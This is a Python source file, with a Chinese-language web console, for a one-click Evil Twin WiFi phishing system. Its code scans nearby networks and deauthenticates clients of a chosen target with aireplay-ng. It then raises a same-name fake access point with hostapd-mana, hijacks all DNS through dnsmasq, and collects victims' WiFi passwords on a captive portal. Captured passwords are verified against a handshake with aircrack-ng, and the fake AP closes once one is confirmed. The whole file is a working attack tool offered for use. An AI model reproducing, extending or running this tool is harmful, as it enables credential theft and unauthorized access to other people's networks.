#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Evil Twin 一键自动化钓鱼系统 (Control Server)
================================================
Web 界面 (默认端口 8090):
  1. 扫描周围 WiFi 列表（按信号强度排序）
  2. 选择目标 (SSID / BSSID / 信道)
  3. 一键启动攻击: deauth 踢人 -> 伪造同名假AP -> DNS劫持 -> 钓鱼页收密码
  4. 捕获密码实时显示，自动验证，验证通过自动关闭假 AP

依赖组件 (与脚本同目录):
  - portal.py          : 80 端口 Captive Portal (密码写入 passwords.txt)
  - hostapd-mana       : 假 AP (开放模式)
  - dnsmasq            : DHCP + DNS 劫持

以 root 运行:  sudo python3 evil_control.py
配置方式: 通过环境变量覆盖默认值（见 config.env.example）
"""
import os
import re
import json
import time
import socket
import threading
import subprocess
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler

# ---------------- 配置（环境变量可覆盖，见 config.env.example） ----------------
IFACE        = os.environ.get("WIFI_IFACE", "wlxYOUR_USB_WIFI_IFACE")
BASE_DIR     = os.environ.get("EVIL_BASE_DIR", "/opt/evil-twin")
PORTAL_PY    = f"{BASE_DIR}/portal.py"
PASSWORDS    = f"{BASE_DIR}/passwords.txt"
HOSTAPD_CONF = f"{BASE_DIR}/evil_auto.conf"
DNSMASQ_CONF = f"{BASE_DIR}/dnsmasq_auto.conf"
LEASES       = "/var/lib/misc/dnsmasq.leases"
CTRL_PORT    = int(os.environ.get("EVIL_CTRL_PORT", "8090"))
GATEWAY_IP   = os.environ.get("EVIL_GATEWAY_IP", "10.0.0.1")
# systemd 单元名
UNITS = {"dnsmasq": "evil-dnsmasq", "portal": "evil-portal", "hostapd": "evil-hostapd"}

# 密码验证握手表: SSID -> (hccapx 文件, AP BSSID)
# 从环境变量 EVIL_HASHES 解析，格式: SSID:路径:BSSID（多个用分号分隔）
# 例: EVIL_HASHES="MyWifi:/opt/evil-twin/handshakes/my.hccapx:AA:BB:CC:DD:EE:FF"
HASHES = {}
for _entry in os.environ.get("EVIL_HASHES", "").split(";"):
    _entry = _entry.strip()
    if not _entry:
        continue
    _parts = _entry.split(":")
    if len(_parts) >= 3:
        HASHES[_parts[0]] = (":".join(_parts[1:-1]), _parts[-1])

# ---------------- 状态 ----------------
state = {
    "mode":    "idle",        # idle | attacking | error
    "target":  None,          # {"ssid","bssid","channel","enc"}
    "last_target": None,      # 目标快照（停止后保留，供历史记录）
    "started": None,
    "captured": [],           # 本次攻击新捕获的密码
    "baseline": 0,            # 攻击开始时 passwords.txt 行数
    "verify": None,           # {"pwd","ok","state"} 密码验证状态
    "history": [],            # [{time,pwd,device,ssid}] 验证通过的历史（跨攻击累积）
    "clients": [],            # DHCP 客户端
    "log": [],
}
lock = threading.Lock()

def log(msg):
    with lock:
        state["log"].append("[%s] %s" % (time.strftime("%H:%M:%S"), msg))
        state["log"] = state["log"][-300:]

def run(cmd, timeout=40):
    """执行 shell 命令（本服务以 root 运行，无需 sudo）"""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1

# ---------------- 扫描 WiFi ----------------
def ensure_managed():
    """确保网卡处于 managed + up（扫描需要）"""
    run(f"nmcli dev set {IFACE} managed yes 2>/dev/null")
    run(f"ip link set {IFACE} down; iw dev {IFACE} set type managed 2>/dev/null; ip link set {IFACE} up")

def scan_wifi():
    """多次扫描合并去重，提高 AP 覆盖率，按信号强度降序"""
    ensure_managed()
    all_aps = []
    for attempt in range(4):
        time.sleep(1.5)
        out, err, rc = run(f"iw dev {IFACE} scan 2>/dev/null")
        aps, cur = [], {}
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("BSS "):
                if cur.get("ssid"):
                    aps.append(cur)
                cur = {"bssid": line.split()[1].split("(")[0].lower(), "enc": "OPEN", "signal": "-100", "channel": "?"}
            elif "SSID:" in line:
                cur["ssid"] = line.split("SSID:", 1)[1].strip()
            elif "freq:" in line:
                try:
                    freq = int(line.split(":", 1)[1].strip())
                    cur["channel"] = str((freq - 2407) // 5) if freq < 5000 else str((freq - 5000) // 5)
                except Exception:
                    pass
            elif "signal:" in line:
                cur["signal"] = line.split(":", 1)[1].strip().split(".")[0]
            elif line.startswith("RSN") or "WPA" in line:
                if cur.get("enc") == "OPEN":
                    cur["enc"] = "WPA/WPA2"
        if cur.get("ssid"):
            aps.append(cur)
        all_aps.extend(aps)
    # 去重（同 SSID+信道 取信号最强）
    seen = {}
    for ap in all_aps:
        key = (ap.get("ssid", ""), ap.get("channel", ""))
        try:
            sig = int(ap["signal"])
        except Exception:
            sig = -100
        if key not in seen or sig > seen[key][0]:
            seen[key] = (sig, ap)
    result = [v[1] for v in seen.values()]
    # 按信号强度降序（最强在前）
    def sig_key(a):
        try:
            return int(a["signal"])
        except Exception:
            return -100
    result.sort(key=sig_key, reverse=True)
    return result

# ---------------- 攻击流程 ----------------
def stop_services():
    for u in UNITS.values():
        run(f"systemctl stop {u} 2>/dev/null")
    run("systemctl reset-failed evil-dnsmasq evil-portal evil-hostapd 2>/dev/null")
    time.sleep(1)

def start_attack(target):
    # 并发保护：立即锁定，防止重复点击产生多个攻击线程
    with lock:
        if state["mode"] == "attacking":
            log("已有攻击在运行，忽略重复请求")
            return -1
        state["mode"] = "attacking"
        state["target"] = target
        state["last_target"] = dict(target)   # 目标快照（stop 后仍保留，供历史记录使用）
        state["started"] = time.time()
        state["captured"] = []
        state["verify"] = None
    ssid, bssid, channel = target["ssid"], target["bssid"], target["channel"]
    log(f"目标: {ssid} ({bssid}) ch{channel}")

    # 1. 停掉可能残留的服务与干扰
    stop_services()
    run(f"pkill -x hostapd-mana; pkill -x dnsmasq; pkill -f '^python3.*portal'")
    time.sleep(1)

    # 2. 切 monitor + 广播 deauth 踢人
    log("切换监听模式，广播 deauth 踢人...")
    run(f"nmcli dev set {IFACE} managed no 2>/dev/null")
    run(f"ip link set {IFACE} down; iw dev {IFACE} set type monitor; ip link set {IFACE} up")
    time.sleep(1)
    run(f"iw dev {IFACE} set channel {channel}")
    time.sleep(1)
    run(f"timeout 6 aireplay-ng -0 5 -a {bssid} {IFACE}", timeout=20)
    log("deauth 完成")

    # 3. 恢复接口（hostapd 启动时会自动切 AP），并配置钓鱼网段地址
    run(f"ip link set {IFACE} down; iw dev {IFACE} set type managed")
    run(f"ip addr flush dev {IFACE} 2>/dev/null")
    run(f"ip addr add {GATEWAY_IP}/24 dev {IFACE}")
    run(f"ip link set {IFACE} up")
    time.sleep(1)

    # 4. 写配置
    hostapd_cfg = (
        f"interface={IFACE}\n"
        f"driver=nl80211\n"
        f"ssid={ssid}\n"
        f"hw_mode=g\n"
        f"channel={channel}\n"
        f"mana_wpaout={BASE_DIR}/mana.hccapx\n"
    )
    with open(HOSTAPD_CONF, "w") as f:
        f.write(hostapd_cfg)
    dnsmasq_cfg = (
        f"interface={IFACE}\n"
        f"dhcp-range=10.0.0.10,10.0.0.100,12h\n"
        f"dhcp-option=3,{GATEWAY_IP}\n"
        f"dhcp-option=6,{GATEWAY_IP}\n"
        f"address=/#/{GATEWAY_IP}\n"
        f"no-resolv\n"
    )
    with open(DNSMASQ_CONF, "w") as f:
        f.write(dnsmasq_cfg)

    # 5. 释放 53 端口 (systemd-resolved 占用)
    run("systemctl stop systemd-resolved 2>/dev/null")
    time.sleep(1)

    # 6. 启动三件套（systemd-run 常驻）
    log("启动 dnsmasq / portal / hostapd-mana ...")
    run(f"systemd-run --unit={UNITS['dnsmasq']} --collect dnsmasq --no-daemon -C {DNSMASQ_CONF}")
    run(f"systemd-run --unit={UNITS['portal']} --collect python3 {PORTAL_PY}")
    run(f"systemd-run --unit={UNITS['hostapd']} --collect hostapd-mana {HOSTAPD_CONF}")
    time.sleep(5)

    # 7. 验证
    out, _, _ = run("systemctl is-active evil-dnsmasq evil-portal evil-hostapd")
    ok = out.count("active")
    log(f"服务状态: dnsmasq/portal/hostapd = {ok}/3 active")
    # 记录本次攻击的密码基线（只显示新捕获的）
    baseline = 0
    if os.path.exists(PASSWORDS):
        with open(PASSWORDS, encoding="utf-8", errors="ignore") as f:
            baseline = sum(1 for _ in f)
    with lock:
        state["baseline"] = baseline
        if ok >= 3:
            state["mode"] = "attacking"
        else:
            state["mode"] = "error"
    if ok < 3:
        log("警告: 有服务未启动，请查看下方日志排查")
    return ok

def stop_attack():
    log("停止攻击，恢复环境...")
    stop_services()
    run("systemctl start systemd-resolved 2>/dev/null")
    ensure_managed()
    # 清理残留的钓鱼网段地址
    run(f"ip addr flush dev {IFACE} 2>/dev/null")
    with lock:
        state["mode"] = "idle"
        state["target"] = None
        state["captured"] = []
        state["baseline"] = 0
        state["verify"] = None
    log("已停止，网卡恢复 managed")

def read_captured():
    """只读取本次攻击开始后新增的非空密码"""
    caps = []
    if os.path.exists(PASSWORDS):
        with lock:
            base = state["baseline"]
        with open(PASSWORDS, encoding="utf-8", errors="ignore") as f:
            for i, line in enumerate(f):
                if i < base:
                    continue
                m = re.search(r"PASSWORD CAPTURED:\s*(\S+)", line)
                if m and m.group(1) != "<empty>":
                    caps.append(m.group(1))
    return caps

def read_clients():
    clients = []
    if os.path.exists(LEASES):
        try:
            with open(LEASES) as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 4:
                        clients.append({"ip": parts[2], "mac": parts[1], "host": parts[3], "time": parts[0]})
        except Exception:
            pass
    return clients

# ---------------- 密码自动验证 ----------------
def verify_password(pwd):
    """用真实握手 hash 验证捕获的密码是否正确。
    返回 {"ok": bool, "note": str, "verified": bool}
      - verified=True  : 已用真实握手验证过，ok 表示是否正确
      - verified=False : 该目标未配置验证基准（无握手），无法确认正确性（ok=True 仅表示已捕获）"""
    with lock:
        tgt = state.get("target") or {}
    ssid = tgt.get("ssid", "")
    entry = HASHES.get(ssid)
    if not entry:
        # 未配置验证基准：捕获成功但无法确认正确性，前端显示黄色提示
        log("警告: 目标 %s 未配置 EVIL_HASHES 验证基准，无法确认密码正确性" % ssid)
        return {"ok": True, "note": "no-hash", "verified": False}
    hfile, bssid = entry
    if not os.path.exists(hfile):
        log("警告: 握手文件 %s 不存在，无法验证" % hfile)
        return {"ok": True, "note": "no-hash-file", "verified": False}
    # 单密码验证（写临时字典，避免引号注入；放工作目录避免 /tmp 权限问题）
    tmp = os.path.join(BASE_DIR, ".verify_tmp.txt")
    try:
        with open(tmp, "w") as f:
            f.write(pwd + "\n")
    except Exception:
        return {"ok": True, "note": "write-fail", "verified": False}
    out, _, rc = run(f"aircrack-ng -w {tmp} -b {bssid} {hfile} 2>&1", timeout=40)
    ok = "KEY FOUND" in out
    log("密码验证: %s -> %s" % (pwd, "正确" if ok else "错误"))
    return {"ok": ok, "note": "verified", "verified": True}

def auto_stop_after_verify(pwd):
    """验证通过后延迟几秒关闭假 AP（让受害者页面先显示成功）"""
    time.sleep(4)
    log("密码正确，自动关闭假 AP")
    stop_attack()

# ---------------- Web 界面 ----------------
HTML = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Evil Twin 自动化钓鱼控制台</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Microsoft YaHei',sans-serif;background:#0f172a;color:#e2e8f0;padding:20px;min-height:100vh}
.wrap{max-width:1000px;margin:0 auto}
h1{font-size:22px;color:#38bdf8;margin-bottom:4px}
.sub{color:#64748b;font-size:13px;margin-bottom:20px}
.card{background:#1e293b;border-radius:12px;padding:18px;margin-bottom:16px;border:1px solid #334155}
.card h2{font-size:15px;color:#94a3b8;margin-bottom:12px;font-weight:600}
.status-line{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.dot{width:10px;height:10px;border-radius:50%;background:#64748b}
.dot.idle{background:#f59e0b}.dot.attacking{background:#22c55e}.dot.error{background:#ef4444}
.badge{background:#334155;border-radius:6px;padding:2px 8px;font-size:12px;color:#94a3b8}
button{background:#2563eb;color:#fff;border:none;border-radius:8px;padding:8px 16px;cursor:pointer;font-size:14px;transition:.2s}
button:hover{background:#1d4ed8}
button:disabled{background:#475569;cursor:not-allowed}
button.danger{background:#dc2626}
button.green{background:#16a34a}
table{width:100%;border-collapse:collapse;font-size:13px}
th{background:#0f172a;color:#64748b;text-align:left;padding:8px 10px;font-weight:600;position:sticky;top:0}
td{padding:8px 10px;border-top:1px solid #334155}
tr:hover td{background:#1e293b}
.scroll{max-height:300px;overflow-y:auto;border:1px solid #334155;border-radius:8px}
.pwd{font-size:32px;font-weight:700;color:#4ade80;letter-spacing:2px;text-align:center;padding:16px;background:#052e16;border-radius:8px;border:1px solid #166534;display:none}
.pwd.show{display:block}
.vbadge{text-align:center;padding:10px 14px;border-radius:8px;font-size:14px;font-weight:600;margin-top:10px}
.vbadge.ok{background:#052e16;color:#4ade80;border:1px solid #166534}
.vbadge.fail{background:#3f0d0d;color:#f87171;border:1px solid #7f1d1d}
.vbadge.wait{background:#422006;color:#fbbf24;border:1px solid #78350f}
.log{background:#0f172a;border-radius:8px;padding:10px;font-family:Consolas,monospace;font-size:12px;max-height:160px;overflow-y:auto;color:#7dd3fc;white-space:pre-wrap}
.target-box{background:#0f172a;border-radius:8px;padding:12px;margin-bottom:12px;font-size:13px;display:none}
.target-box.show{display:block}
.kv{color:#94a3b8}.kv b{color:#e2e8f0}
.empty{color:#475569;text-align:center;padding:20px;font-size:13px}
.toolbar{display:flex;gap:10px;margin-bottom:12px;align-items:center}
#scanBtn.active{animation:pulse 1s infinite}
@keyframes pulse{50%{opacity:.5}}
</style>
</head>
<body>
<div class="wrap">
<h1>&#x1F50D; Evil Twin 自动化钓鱼控制台</h1>
<div class="sub">选择目标 WiFi → 一键攻击 → 受害者输密码 → 明文直接显示
<br>访问方式：局域网 <b>http://&lt;本机IP&gt;:8090</b> · 钓鱼通道 <b>http://10.0.0.1:8090</b>（受害者连假 AP 后）</div>

<div class="card">
  <div class="status-line">
    <span class="dot" id="dot"></span>
    <span id="statusText">未连接</span>
    <span class="badge" id="targetBadge">未选择目标</span>
  </div>
  <div id="verifiableBox" style="font-size:12px;color:#64748b"></div>
</div>

<div class="card">
  <div class="toolbar">
    <h2 style="margin:0">附近 WiFi 列表</h2>
    <button id="scanBtn" onclick="doScan()">&#x1F50D; 扫描 WiFi</button>
    <button class="danger" id="stopBtn" onclick="doStop()" disabled>&#x23F9; 停止攻击</button>
  </div>
  <div class="scroll">
    <table>
      <thead><tr><th></th><th>SSID</th><th>BSSID</th><th>CH</th><th>加密</th><th>信号</th></tr></thead>
      <tbody id="apBody"><tr><td colspan="6" class="empty">点击「扫描 WiFi」获取附近网络</td></tr></tbody>
    </table>
  </div>
</div>

<div class="card">
  <h2>&#x1F3AF; 攻击目标</h2>
  <div class="target-box" id="targetBox">
    <div class="kv" id="targetInfo"></div>
    <button class="green" id="attackBtn" onclick="doAttack()">&#x26A1; 开始攻击</button>
  </div>
  <div class="empty" id="targetEmpty">从上方列表选择一个 WiFi</div>
</div>

<div class="card">
  <h2>&#x1F511; 最新捕获密码</h2>
  <div class="pwd" id="pwdBox">--</div>
  <div class="vbadge" id="vbadge" style="display:none"></div>
  <h2 style="margin-top:18px">&#x1F4DC; 历史记录（最近 5 条）</h2>
  <div class="scroll" style="max-height:180px">
    <table>
      <thead><tr><th style="width:20%">时间</th><th style="width:30%">WiFi</th><th style="width:30%">密码</th><th>设备</th></tr></thead>
      <tbody id="histBody"><tr><td colspan="4" class="empty">暂无记录</td></tr></tbody>
    </table>
  </div>
  <div style="margin-top:10px" id="clientBox"></div>
</div>

<div class="card">
  <h2>&#x1F4CB; 运行日志</h2>
  <div class="log" id="logBox">等待操作...</div>
</div>
</div>

<script>
let sel = null;
const $ = id => document.getElementById(id);

async function api(path, opts) {
  const r = await fetch(path, opts);
  return r.json();
}

function setDot(cls, txt) {
  $('dot').className = 'dot ' + cls;
  $('statusText').textContent = txt;
}

async function doScan() {
  $('scanBtn').disabled = true; $('scanBtn').classList.add('active');
  $('scanBtn').textContent = '扫描中...';
  setDot('idle', '正在扫描附近 WiFi...');
  try {
    const d = await api('/api/scan');
    const body = $('apBody');
    if (!d.aps || !d.aps.length) {
      body.innerHTML = '<tr><td colspan="6" class="empty">未发现 WiFi（请检查网卡是否正常）</td></tr>';
    } else {
      body.innerHTML = d.aps.map((a,i) =>
        `<tr onclick="pick(${i})" style="cursor:pointer">
          <td>${a.enc === 'OPEN' ? '&#x1F513;' : '&#x1F512;'}</td>
          <td>${a.ssid || '<i style=color:#475569>(隐藏)</i>'}</td>
          <td style="font-family:Consolas">${a.bssid}</td>
          <td>${a.channel}</td><td>${a.enc}</td><td>${a.signal} dBm</td>
        </tr>`).join('');
      window._aps = d.aps;
    }
    setDot('idle', '扫描完成');
    $('scanBtn').textContent = '&#x1F50D; 扫描 WiFi';
  } catch (e) {
    setDot('error', '扫描失败: ' + e.message);
    $('scanBtn').textContent = '&#x1F50D; 扫描 WiFi';
  }
  $('scanBtn').disabled = false; $('scanBtn').classList.remove('active');
}

function pick(i) {
  const a = window._aps[i];
  if (!a || !a.ssid) return;
  sel = a;
  $('targetBox').classList.add('show');
  $('targetEmpty').style.display = 'none';
  $('targetInfo').innerHTML =
    `SSID: <b>${a.ssid}</b> &nbsp;|&nbsp; BSSID: <b style="font-family:Consolas">${a.bssid}</b> &nbsp;|&nbsp; 信道: <b>${a.channel}</b> &nbsp;|&nbsp; 加密: <b>${a.enc}</b> &nbsp;|&nbsp; 信号: <b>${a.signal} dBm</b>`;
  $('targetBadge').textContent = '目标: ' + a.ssid;
}

async function doAttack() {
  if (!sel) return;
  $('attackBtn').disabled = true; $('attackBtn').textContent = '攻击中...';
  setDot('attacking', '攻击进行中');
  $('stopBtn').disabled = false;
  try {
    const d = await api('/api/start', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ssid: sel.ssid, bssid: sel.bssid, channel: sel.channel})
    });
    if (!d.ok) {
      setDot('error', '启动失败: ' + (d.error || ''));
      $('attackBtn').disabled = false; $('attackBtn').textContent = '&#x26A1; 开始攻击';
    }
  } catch (e) {
    setDot('error', '请求失败: ' + e.message);
    $('attackBtn').disabled = false; $('attackBtn').textContent = '&#x26A1; 开始攻击';
  }
}

async function doStop() {
  setDot('idle', '正在停止...');
  const d = await api('/api/stop', {method: 'POST'});
  $('stopBtn').disabled = true;
  setDot('idle', '已停止');
}

async function poll() {
  try {
    const d = await api('/api/status');
    // captured passwords + verify badge (只显示最新一条)
    if (d.captured && d.captured.length) {
      const latest = d.captured[d.captured.length - 1];
      $('pwdBox').textContent = latest;
      $('pwdBox').classList.add('show');
      const vb = $('vbadge');
      if (d.verify && d.verify.pwd === latest) {
        if (d.verify.state === 'ok' && d.verify.verified) {
          vb.className = 'vbadge ok'; vb.style.display = 'block';
          vb.textContent = '&#x2705; 密码验证通过！正在自动关闭假 AP...';
        } else if (d.verify.state === 'ok' && !d.verify.verified) {
          vb.className = 'vbadge wait'; vb.style.display = 'block';
          vb.textContent = '&#x26A0;&#xFE0F; 已捕获密码，但该 WiFi 未配置验证基准（EVIL_HASHES），无法确认正确性';
        } else {
          vb.className = 'vbadge fail'; vb.style.display = 'block';
          vb.textContent = '&#x274C; 密码错误，受害者正在重新输入...';
        }
      } else {
        vb.className = 'vbadge wait'; vb.style.display = 'block';
        vb.textContent = '&#x23F3; 等待密码验证...';
      }
    } else {
      $('vbadge').style.display = 'none';
    }
    // history (最近5条，只含验证通过的正确密码)
    if (d.history && d.history.length) {
      $('histBody').innerHTML = d.history.slice(-5).reverse().map(h =>
        `<tr><td style="font-family:Consolas">${h.time}</td><td style="color:#7dd3fc">${h.ssid || '-'}</td><td style="font-family:Consolas;color:#4ade80;font-weight:600">${h.pwd}</td><td>${h.device || '-'}</td></tr>`
      ).join('');
    }
    // clients
    if (d.clients && d.clients.length) {
      $('clientBox').innerHTML = '<div style="font-size:12px;color:#64748b;margin-bottom:6px">已连接假 AP 的设备:</div>' +
        d.clients.map(c => `<span class="badge">${c.ip} · ${c.host} · ${c.mac}</span> `).join('');
    } else {
      $('clientBox').innerHTML = '';
    }
    // verifiable wifi list
    if (d.verifiable && d.verifiable.length) {
      $('verifiableBox').innerHTML = '&#x1F510; 已配置验证基准（可自动验证密码正确性）: ' +
        d.verifiable.map(s => `<span class="badge" style="color:#4ade80">${s}</span>`).join(' ');
    } else {
      $('verifiableBox').innerHTML = '&#x26A0;&#xFE0F; 尚未配置任何验证基准（EVIL_HASHES），所有密码只能捕获无法验证';
    }
    // log
    if (d.log && d.log.length) {
      $('logBox').textContent = d.log.slice(-40).join('\\n');
      $('logBox').scrollTop = $('logBox').scrollHeight;
    }
    // mode sync: 攻击中锁定按钮，idle 恢复
    if (d.mode === 'attacking') {
      $('attackBtn').disabled = true;
      $('attackBtn').textContent = '&#x26A1; 攻击进行中...';
      $('stopBtn').disabled = false;
    } else if (d.mode === 'idle') {
      $('stopBtn').disabled = true;
      if (sel) {
        $('attackBtn').disabled = false;
        $('attackBtn').textContent = '&#x26A1; 开始攻击';
      }
      if (d.verify && d.verify.state === 'ok' && d.verify.verified) {
        setDot('idle', '攻击已结束：密码验证通过，假 AP 已关闭');
      }
    }
  } catch (e) { /* ignore */ }
}
setInterval(poll, 2000);
poll();
</script>
</body>
</html>"""

# ---------------- HTTP Handler ----------------
class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def send_json(self, obj, code=200):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == "/":
            body = HTML.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif path == "/api/scan":
            aps = scan_wifi()
            self.send_json({"aps": aps})
        elif path == "/api/status":
            with lock:
                st = {
                    "mode": state["mode"],
                    "target": state["target"],
                    "captured": list(state["captured"]),
                    "verify": state["verify"],
                    "log": list(state["log"]),
                    "clients": read_clients(),
                }
            st["captured"] = read_captured() if state["mode"] == "attacking" else []
            with lock:
                state["captured"] = st["captured"]
                # 历史记录只由 /api/verify 验证通过时写入（见 do_POST /api/verify）
                st["history"] = list(state["history"])[-5:]
            st["verifiable"] = sorted(HASHES.keys())
            self.send_json(st)
        else:
            self.send_json({"error": "not found"}, 404)

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        length = int(self.headers.get("Content-Length", 0))
        data = {}
        if length:
            try:
                data = json.loads(self.rfile.read(length).decode("utf-8"))
            except Exception:
                pass
        if path == "/api/start":
            if state["mode"] == "attacking":
                self.send_json({"ok": False, "error": "已有攻击在运行，请先停止"})
                return
            ssid = data.get("ssid", "").strip()
            bssid = data.get("bssid", "").strip()
            channel = str(data.get("channel", "")).strip()
            if not ssid or not bssid or not channel:
                self.send_json({"ok": False, "error": "缺少目标参数"})
                return
            threading.Thread(target=start_attack,
                             args=({"ssid": ssid, "bssid": bssid, "channel": channel},),
                             daemon=True).start()
            self.send_json({"ok": True})
        elif path == "/api/verify":
            pwd = data.get("password", "")
            if not pwd:
                self.send_json({"ok": False, "error": "no password"})
                return
            v = verify_password(pwd)
            # 更新验证状态（前端展示）；verified 字段区分"真验证通过"与"未配置基准"
            with lock:
                state["verify"] = {
                    "pwd": pwd,
                    "ok": v["ok"],
                    "state": "ok" if v["ok"] else "fail",
                    "note": v["note"],
                    "verified": v.get("verified", False),
                }
            # 只有真正通过真实握手验证（verified）才：写历史 + 自动关闭假 AP
            if v["ok"] and v.get("verified"):
                # 验证通过：写入历史记录（只记录正确密码），并延迟自动关闭假 AP
                dev = ""
                for c in read_clients():
                    dev = c["host"]
                with lock:
                    ssid = (state.get("last_target") or {}).get("ssid", "?")
                    state["history"].append({
                        "time": time.strftime("%H:%M:%S"),
                        "pwd": pwd,
                        "device": dev,
                        "ssid": ssid,
                    })
                    state["history"] = state["history"][-20:]
                threading.Thread(target=auto_stop_after_verify, args=(pwd,), daemon=True).start()
            self.send_json(v)
        elif path == "/api/stop":
            threading.Thread(target=stop_attack, daemon=True).start()
            self.send_json({"ok": True})
        else:
            self.send_json({"error": "not found"}, 404)

# ---------------- Main ----------------
if __name__ == "__main__":
    log("控制服务启动，端口 %d" % CTRL_PORT)
    log("网卡: %s  钓鱼页: %s" % (IFACE, PORTAL_PY))
    if os.geteuid() != 0:
        log("警告: 未以 root 运行，部分命令可能失败，请使用 sudo")
    srv = HTTPServer(("0.0.0.0", CTRL_PORT), Handler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("shutdown")
